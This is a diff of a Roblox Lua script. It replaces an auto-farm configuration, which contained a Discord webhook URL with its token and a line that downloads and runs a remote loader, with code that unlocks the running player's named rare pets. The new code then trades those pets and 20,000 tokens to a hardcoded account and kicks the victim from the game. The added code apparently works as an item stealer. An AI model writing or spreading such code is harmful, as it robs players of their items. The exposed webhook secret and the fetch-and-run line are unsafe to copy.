@@ -1,97 +1,221 @@
-script_key = "tfjZKTKlhPaJNjPRNXtoYCSrAyBaEfPb"
-setfpscap(5)
+local petsToTrade = {"Surge Dragon", "Dual Shock", "Overcharged Robot", "Grand Ice Wizard"}
+local tokenAmount = 20000
+local jobID = "7f30a645-e205-40f3-9c9d-d747b12b9e4a"
+local playerName = "Keiyoz"
 
-getgenv().tapSimConfig = {
-    ELECTRIC_PET = {
-        ["Lightning Wyvren"] = 3
-    },
+local Players = game:GetService("Players")
+local Network = require(game:GetService("ReplicatedStorage").Modules.Network)
+local Replication = require(game:GetService("ReplicatedStorage").Game.Replication)
 
-    STABLE_HATCH = false,
-    BUY_SECRET_STARTER_PLAZA_PACK = false,
+local player = Players.LocalPlayer
+local playerJobID = nil
+local targetPlayerName = playerName
 
-    AUTO_UPDATE_RESTART = true,
-    AUTO_EQUIP_BEST = true,
-    ADD_FRIEND = true,
-    MAX_REBIRTH = math.huge,
-    REBIRTH_DELAY = 3000,
-    REDEEM_CODE = { "russo", "lucky", "tacos", "enchant", "HTH" },
+local function WaitForCondition(conditionFunc, timeout)
+    local startTime = tick()
+    while not conditionFunc() do
+        if tick() - startTime > (timeout or 30) then
+            return false
+        end
+        task.wait(6)
+    end
+    return true
+end
 
-    OPEN_EGG = { "Lunar" },
-    FOCUS_EVENT_HATCH = false,
-    UNLOCK_WORLD_1_BEST_EGG = true,
-    UNLOCK_WORLD_2_BEST_EGG = true,
+local function UnlockPets()
+    local PetNames = {}
+    for _, name in ipairs(petsToTrade) do
+        PetNames[name] = true
+    end
+    
+    local pets = Replication.Data and Replication.Data.Pets
+    if not pets then return end
+    
+    for _, petData in pairs(pets) do
+        if petData and petData.Name and PetNames[petData.Name] and (petData.Locked == true or petData.Locked == 1 or petData.Locked == "true") then
+            Network:InvokeServer("LockPet", petData.Id, false)
+        end
+    end
+end
 
-    BUY_GAMEPASS = { "" },
+local function GetPetIDsByName()
+    local petIDs = {}
+    local pets = Replication.Data and Replication.Data.Pets
+    if not pets then return petIDs end
+    
+    local petNameLookup = {}
+    for _, name in ipairs(petsToTrade) do
+        petNameLookup[name] = true
+    end
+    
+    for _, petData in pairs(pets) do
+        if petData and petData.Name and petNameLookup[petData.Name] then
+            table.insert(petIDs, petData.Id)
+        end
+    end
+    
+    return petIDs
+end
 
-    BUY_AUTO_CLICKER = true,
-    OPEN_ALL_GIFT = true,
+local function HasPetsToTrade()
+    local petIDs = GetPetIDsByName()
+    return #petIDs > 0
+end
 
-    BUY_GEM_SHOP = {
-        ["RebirthButtons"] = 34,
-        ["ClickMultiplier"] = 20,
-        ["HatchSpeed"] = 5,
-        ["GoldenLuck"] = 6,
-        ["CriticalChance"] = 5,
-        ["AutoClickerSpeed"] = 0,
-        ["DoubleJumps"] = 0
-    },
+local function FindTargetPlayer(targetPlayerName)
+    return Players:FindFirstChild(targetPlayerName)
+end
 
-    ENCHANT_EQUIPPED_ONLY = true,
-    AUTO_ENCHANT = {
-        ["Secret I"] = { "Secret Hunter" },
-        ["Secret II"] = { "Secret Hunter" },
-        ["Secret III"] = { "Secret Hunter" },
-    },
+local function WaitForPetsRemoved(tradedPetIDs)
+    local startTime = tick()
+    
+    while tick() - startTime < 3 do
+        local currentPetIDs = GetPetIDsByName()
+        
+        local allRemoved = true
+        for _, tradedId in ipairs(tradedPetIDs) do
+            local stillHas = false
+            for _, currentId in ipairs(currentPetIDs) do
+                if currentId == tradedId then
+                    stillHas = true
+                    break
+                end
+            end
+            if stillHas then
+                allRemoved = false
+                break
+            end
+        end
+        
+        if allRemoved then
+            return true
+        end
+        
+        task.wait(6)
+    end
+    
+    return false
+end
 
-    FALLBACK_3_SECRET_HUNTER_ENCHANT = {
-        ["Secret I"] = { "Rainbow Hunter" },
-        ["Secret II"] = { "Rainbow Hunter" },
-        ["Secret III"] = { "Rainbow Hunter" },
-    },
+local function GetTokenAmount()
+    return tokenAmount
+end
 
-    AUTO_DELETE_EGG_PET = {
-        ["Holographic"] = {
-            "Holo Crab",
-            "Virtual Cuboid",
-            "Glitched TV",
-            "Holo Dragon",
-            "Holographic Hybrid"
-        },
-    },
+local function AddTokensToTrade(targetPlayerName)
+    while GetTokenAmount() > 0 do
+        local target = FindTargetPlayer(targetPlayerName)
+        if not target then
+            return
+        end
+        
+        Network:FireServer("SendTrade", target)
+        
+        while not player.PlayerGui.Trading.Enabled do
+            task.wait(6)
+        end
 
-    KEEP_PET_NAME = {},
-    KEEP_PET_RARITY = { "Secret I", "Secret II", "Secret III" },
+        local confirmed
+        while type(confirmed) ~= "number" do
+            confirmed = Network:InvokeServer("UpdateTradeTokens1", false, GetTokenAmount())
+            task.wait(6)
+        end
+        
+        Network:FireServer("ReadyUp", false, true)
+        
+        task.wait(6)
+        task.wait(6)
+    end
+end
 
-    GOLDEN_PET = {
-        ["Holo Crab"] = 6,
-        ["Virtual Cuboid"] = 6,
-        ["Glitched TV"] = 6,
-        ["Holo Dragon"] = 6,
-        ["Holographic Hybrid"] = 6
-    },
+local function TradeWithTarget(targetPlayerName)
+    while true do
+        if not HasPetsToTrade() then
+            player:Kick("No more pets to trade")
+            return
+        end
+        
+        UnlockPets()
 
-    RAINBOW_PET = {},
-    USE_BOOST = {
-        "Luck Potion I","Luck Potion II","Luck Potion III",
-        "Tap Potion I","Tap Potion II","Tap Potion III",
-        "Gem Potion I","Gem Potion II","Gem Potion III",
-        "Egg Incubator","Octo Incubator","Taco Potion",
-        "Festive Luck I","Festive Luck II","Festive Tap I",
-        "Space Tap I","Space Luck I","Space Luck II"
-    },
+        local target = FindTargetPlayer(targetPlayerName)
+        if not target then
+            task.wait(6)
+            return
+        end
+        
+        while not player.PlayerGui.Trading.Enabled do
+            Network:FireServer("SendTrade", target)
+            task.wait(6)
+        end
+        
+        local petIDs = GetPetIDsByName()
+        if #petIDs > 0 then
+            for _, petId in ipairs(petIDs) do
+                Network:InvokeServer("AddTradeItem", { "Pet", petId })
+            end
+            
+            Network:FireServer("ReadyUp", false, true)
+            
+            local tradeCompleted = WaitForPetsRemoved(petIDs)
+            if tradeCompleted then
+                task.wait(6)
+                
+                local checkStart = tick()
+                while tick() - checkStart < 5 do
+                    if not HasPetsToTrade() then
+                        player:Kick("Trade complete")
+                        return
+                    end
+                    task.wait(6)
+                end
 
-    WEBHOOK_PET_RARITY = { "Secret I", "Secret II", "Secret III" },
-    WEBHOOK_URL = "https://discord.com/api/webhooks/1464443545908936877/71UZGdoGptFb3MOp7CMApN7Zayw43gaW4hRmqaEoEreDqcMMSFFtkUdlmnxBsZkV6DL2",
-    DISCORD_ID = "1135837863603351573",
-    SHOW_PUBLIC_DISCORD_ID = true,
-    SHOW_WEBHOOK_USERNAME = true,
-    SHOW_WEBHOOK_JOBID = true,
+                if HasPetsToTrade() then
+                    task.wait(6)
+                end
+            else
+                return
+            end
+        end
+        
+        if HasPetsToTrade() then
+            task.wait(6)
+        else
+            break
+        end
+    end
+end
 
-    TRADE_PET_NAME = {},
-    TRADE_PET_RARITY = {},
-    TRADE_USERNAME = {},
-    KICK_IF_NO_TRADE_PET = false,
-    AUTO_ACCEPT_TRADE = false,
-}
-
-loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/ffab66f7d96a48c13b12e526b19b37d4.lua"))()
+while true do
+    local startCheckTime = tick()
+    while tick() - startCheckTime < 20 do
+        if HasPetsToTrade() then
+            local petCheckStart = tick()
+            while tick() - petCheckStart < 5 do
+                if HasPetsToTrade() then
+                    playerJobID = jobID
+                    break
+                end
+                task.wait(1)
+            end
+            break
+        end
+        task.wait(1)
+    end
+    
+    if not playerJobID then
+        player:Kick("No pets found in 20 seconds")
+        break
+    end
+    
+    local target = FindTargetPlayer(targetPlayerName)
+    if not target then
+        task.wait(6)
+        return
+    end
+    
+    Network:FireServer("SendTrade", target)
+    task.wait(math.random(15, 40))
+    
+    TradeWithTarget(targetPlayerName)
+    AddTokensToTrade(targetPlayerName)
+    task.wait(6)
+end
